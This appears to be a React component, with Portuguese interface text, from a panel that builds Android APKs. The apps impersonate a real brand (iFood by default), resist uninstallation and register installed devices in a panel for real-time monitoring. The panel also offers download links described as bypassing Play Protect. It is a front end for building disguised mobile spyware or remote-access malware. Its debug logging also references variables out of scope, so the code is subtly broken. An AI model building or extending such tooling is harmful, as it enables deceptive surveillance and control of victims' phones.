import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Progress } from "@/components/ui/progress";
import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone, Trash2 } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { generateInstallLink, shareLink } from "@/lib/install-link";

export function APKBuilder() {
  const [appName, setAppName] = useState("iFood");
  const [appUrl, setAppUrl] = useState("https://www.ifood.com.br/");
  const [logoUrl, setLogoUrl] = useState("");
  const [protectFromUninstall, setProtectFromUninstall] = useState(true);
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);

  const buildMutation = trpc.apk.build.useMutation();
  const listQuery = trpc.apk.list.useQuery(undefined, {
    refetchInterval: 2000, // Recarregar a cada 2 segundos
  });
  const clearHistoryMutation = trpc.apk.clearHistory.useMutation();

  const handleBuild = async () => {
    if (!appName.trim()) {
      toast.error("Nome do app é obrigatório");
      return;
    }

    if (!appUrl.trim()) {
      toast.error("URL do app é obrigatória");
      return;
    }

    setIsBuilding(true);
    setBuildProgress(0);

    let progressInterval: ReturnType<typeof setInterval> | null = null;

    try {
      // Simular progresso
      progressInterval = setInterval(() => {
        setBuildProgress((prev) => {
          if (prev >= 90) return prev;
          return prev + Math.random() * 20;
        });
      }, 500);

      const result = await buildMutation.mutateAsync({
        appName,
        appUrl,
        logoUrl: logoUrl || undefined,
        protectFromUninstall,
      });

      if (progressInterval) clearInterval(progressInterval);
      setBuildProgress(100);

      toast.success("APK em construção - Seu APK está sendo gerado. Você receberá o link em breve!");

      // Polling para recarregar lista até o APK estar pronto
      let isReady = false;
      let attempts = 0;
      const maxAttempts = 60;
      
      while (!isReady && attempts < maxAttempts) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Refetch retorna o resultado diretamente
        const refetchResult = await listQuery.refetch();
        const builds = refetchResult.data || [];
        const latestBuild = builds[builds.length - 1];
        
        // Verificar se o build mais recente é o que acabamos de criar
        if (latestBuild && 
            latestBuild.appName === appName && 
            latestBuild.status === 'success' && 
            latestBuild.fileSize && 
            latestBuild.fileSize > 0) {
          isReady = true;
          toast.success("APK gerado com sucesso! Link disponível abaixo.");
        }
        
        attempts++;
      }
      
      if (!isReady) {
        toast.warning("APK ainda está sendo processado. Tente recarregar a página em alguns instantes.");
      }

      // Forçar atualização final
      console.log("[DEBUG] Polling finalizado. isReady:", isReady);
      console.log("[DEBUG] listQuery.data:", listQuery.data);
      console.log("[DEBUG] builds:", builds);
      console.log("[DEBUG] successfulBuilds:", builds.filter((b) => b.status === "success"));
      console.log("[DEBUG] latestBuild:", latestBuild);

      // Limpar formulário
      setTimeout(() => {
        setIsBuilding(false);
        setBuildProgress(0);
      }, 1000);
    } catch (error) {
      if (progressInterval) clearInterval(progressInterval);
      setIsBuilding(false);
      setBuildProgress(0);
      
      // Extrair mensagem de erro
      let errorMessage = "Erro ao gerar APK";
      if (error instanceof Error) {
        errorMessage = error.message;
      } else if (typeof error === "object" && error !== null && "message" in error) {
        errorMessage = (error as any).message;
      }
      
      console.error("Erro ao gerar APK:", error);
      toast.error(errorMessage);
    }
  };

  const builds = listQuery.data || [];
  // Mostrar o build mais recente que tem fileSize (sucesso), ou o mais recente se nenhum tiver fileSize
  const latestBuild = builds.find((b) => b.fileSize && b.fileSize > 0) || builds[0];
  
  // Debug
  console.log('[APKBuilder] builds:', builds.length, 'latestBuild:', latestBuild?.appName, 'fileSize:', latestBuild?.fileSize);

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center gap-3">
        <Hammer className="w-8 h-8 text-cyan-400" />
        <div>
          <h1 className="text-3xl font-bold">APK Builder</h1>
          <p className="text-gray-400">Gere um APK customizado que abre qualquer URL em WebView</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Formulário */}
        <div className="lg:col-span-1">
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <div className="w-6 h-6 bg-cyan-500 rounded flex items-center justify-center text-sm font-bold">
                  ⚙️
                </div>
                Configuração
              </CardTitle>
              <CardDescription>Personalize seu APK</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* Nome do App */}
              <div className="space-y-2">
                <Label htmlFor="appName" className="text-gray-300">
                  Nome do App *
                </Label>
                <Input
                  id="appName"
                  value={appName}
                  onChange={(e) => setAppName(e.target.value)}
                  placeholder="Ex: iFood"
                  className="bg-slate-700 border-slate-600 text-white"
                  disabled={isBuilding}
                />
                <p className="text-xs text-gray-500">Aparecerá no ícone do app</p>
              </div>

              {/* URL do App */}
              <div className="space-y-2">
                <Label htmlFor="appUrl" className="text-gray-300">
                  URL do App *
                </Label>
                <Input
                  id="appUrl"
                  type="url"
                  value={appUrl}
                  onChange={(e) => setAppUrl(e.target.value)}
                  placeholder="https://www.ifood.com.br/"
                  className="bg-slate-700 border-slate-600 text-white"
                  disabled={isBuilding}
                />
                <p className="text-xs text-gray-500">O APK abrirá esta URL</p>
              </div>

              {/* Logo URL */}
              <div className="space-y-2">
                <Label htmlFor="logoUrl" className="text-gray-300">
                  Logo do App (URL)
                </Label>
                <Input
                  id="logoUrl"
                  type="url"
                  value={logoUrl}
                  onChange={(e) => setLogoUrl(e.target.value)}
                  placeholder="https://example.com/logo.png"
                  className="bg-slate-700 border-slate-600 text-white"
                  disabled={isBuilding}
                />
                <p className="text-xs text-gray-500">Opcional - Logo no ícone do app</p>
              </div>

              {/* Proteção contra desinstalação */}
              <div className="flex items-center space-x-2 pt-2">
                <Checkbox
                  id="protect"
                  checked={protectFromUninstall}
                  onCheckedChange={(checked) => setProtectFromUninstall(checked as boolean)}
                  disabled={isBuilding}
                />
                <Label htmlFor="protect" className="text-gray-300 cursor-pointer">
                  Proteção contra desinstalação
                </Label>
              </div>

              {/* Barra de progresso */}
              {isBuilding && (
                <div className="space-y-2 pt-4">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Gerando APK...</span>
                    <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                  </div>
                  <Progress value={buildProgress} className="bg-slate-700" />
                </div>
              )}

              {/* Botão Gerar */}
              <Button
                onClick={handleBuild}
                disabled={isBuilding}
                className="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-semibold py-2 h-10"
              >
                {isBuilding ? (
                  <>
                    <div className="animate-spin mr-2 w-4 h-4 border-2 border-white border-t-transparent rounded-full" />
                    Gerando APK...
                  </>
                ) : (
                  <>
                    <Download className="w-4 h-4 mr-2" />
                    Gerar APK
                  </>
                )}
              </Button>
            </CardContent>
          </Card>
        </div>

        {/* Preview + Info */}
        <div className="lg:col-span-2 space-y-6">
          {/* Pré-visualização */}
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Smartphone className="w-5 h-5 text-cyan-400" />
                Pré-visualização do Celular
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="flex justify-center">
                <div className="w-64 h-96 bg-black rounded-3xl border-8 border-gray-800 shadow-2xl flex flex-col items-center justify-center relative">
                  {/* Notch */}
                  <div className="absolute top-0 left-1/2 transform -translate-x-1/2 w-40 h-6 bg-black rounded-b-3xl border-l-2 border-r-2 border-b-2 border-gray-800" />

                  {/* Conteúdo */}
                  <div className="flex flex-col items-center gap-4 mt-8">
                    {/* Ícone do App */}
                    <div className="w-20 h-20 bg-gradient-to-br from-cyan-500 to-blue-600 rounded-2xl flex items-center justify-center shadow-lg">
                      {logoUrl ? (
                        <img src={logoUrl} alt={appName} className="w-full h-full rounded-2xl object-cover" />
                      ) : (
                        <span className="text-white font-bold text-2xl">{appName[0]}</span>
                      )}
                    </div>

                    {/* Nome do App */}
                    <p className="text-white font-semibold text-center text-sm">{appName}</p>

                    {/* Texto */}
                    <p className="text-gray-400 text-xs text-center">Toque para abrir</p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Como funciona */}
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <AlertCircle className="w-5 h-5 text-cyan-400" />
                Como funciona:
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3 text-sm text-gray-300">
              <div className="flex gap-3">
                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                  ✓
                </div>
                <p>APK abre uma URL em WebView</p>
              </div>
              <div className="flex gap-3">
                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                  ✓
                </div>
                <p>Cliente instala normalmente</p>
              </div>
              <div className="flex gap-3">
                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                  ✓
                </div>
                <p>Dispositivo aparece no painel</p>
              </div>
              <div className="flex gap-3">
                <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                  ✓
                </div>
                <p>Você monitora em tempo real</p>
              </div>
            </CardContent>
          </Card>

          {/* Download Info */}
          {latestBuild && (
            <Card className="bg-slate-800 border-slate-700 border-cyan-600">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-cyan-400">
                  <CheckCircle2 className="w-5 h-5" />
                  Download Info
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div>
                  <p className="text-sm text-gray-400 mb-2">Link de Instalacao (com Play Protect):</p>
                  <div className="bg-slate-700/50 rounded p-2 mb-2 break-all text-xs text-cyan-300 max-h-20 overflow-y-auto">
                    {generateInstallLink({
                      filename: latestBuild.filename,
                      appName: latestBuild.appName,
                      downloadUrl: latestBuild.downloadUrl,
                      fileSize: latestBuild.fileSize || undefined,
                    })}
                  </div>
                  <Button
                    size="sm"
                    variant="outline"
                    className="w-full border-cyan-400/30 text-cyan-300 hover:bg-cyan-900/20"
                    onClick={() => {
                      const link = generateInstallLink({
                        filename: latestBuild.filename,
                        appName: latestBuild.appName,
                        downloadUrl: latestBuild.downloadUrl,
                        fileSize: latestBuild.fileSize || undefined,
                      });
                      navigator.clipboard.writeText(link);
                      toast.success("Link copiado para clipboard!");
                    }}
                  >
                    Copiar Link
                  </Button>
                </div>
                <div>
                  <p className="text-sm text-gray-400 mb-2">Link Direto (sem Play Protect):</p>
                  <a
                    href={latestBuild.downloadUrl}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-cyan-400 hover:text-cyan-300 break-all text-xs"
                  >
                    {latestBuild.downloadUrl}
                  </a>
                </div>
                <div>
                  <p className="text-sm text-gray-400">Tamanho:</p>
                  <p className="text-white">
                    {latestBuild.fileSize ? (
                      latestBuild.fileSize < 1024 * 1024
                        ? `${(latestBuild.fileSize / 1024).toFixed(2)}KB`
                        : `${(latestBuild.fileSize / 1024 / 1024).toFixed(2)}MB`
                    ) : (
                      "Calculando..."
                    )}
                  </p>
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      </div>

      {/* Histórico de Builds */}
      {builds.length > 0 && (
        <Card className="bg-slate-800 border-slate-700">
          <CardHeader className="flex flex-row items-center justify-between">
            <div>
              <CardTitle>Histórico de Builds</CardTitle>
              <CardDescription>Seus APKs gerados anteriormente</CardDescription>
            </div>
            <Button
              onClick={() => {
                if (confirm('Tem certeza que deseja deletar todo o histórico de builds?')) {
                  clearHistoryMutation.mutate(undefined, {
                    onSuccess: () => {
                      toast.success('Histórico deletado com sucesso');
                      listQuery.refetch();
                    },
                    onError: () => {
                      toast.error('Erro ao deletar histórico');
                    },
                  });
                }
              }}
              variant="destructive"
              size="sm"
              className="gap-2"
              disabled={clearHistoryMutation.isPending}
            >
              <Trash2 className="w-4 h-4" />
              Limpar
            </Button>
          </CardHeader>
          <CardContent>
            <div className="space-y-2">
              {builds.map((build) => (
                <div key={build.id} className="flex items-center justify-between p-3 bg-slate-700 rounded-lg">
                  <div>
                    <p className="font-semibold text-white">{build.appName}</p>
                    <p className="text-xs text-gray-400">{build.filename}</p>
                  </div>
                  <div className="flex items-center gap-2">
                    {build.status === "success" && (
                      <>
                        <span className="text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded">Pronto</span>
                        <a
                          href={build.downloadUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-cyan-400 hover:text-cyan-300"
                        >
                          <Download className="w-4 h-4" />
                        </a>
                      </>
                    )}
                    {build.status === "building" && (
                      <span className="text-xs bg-blue-500/20 text-blue-400 px-2 py-1 rounded">Gerando...</span>
                    )}
                    {build.status === "failed" && (
                      <span className="text-xs bg-red-500/20 text-red-400 px-2 py-1 rounded">Erro</span>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  );
}
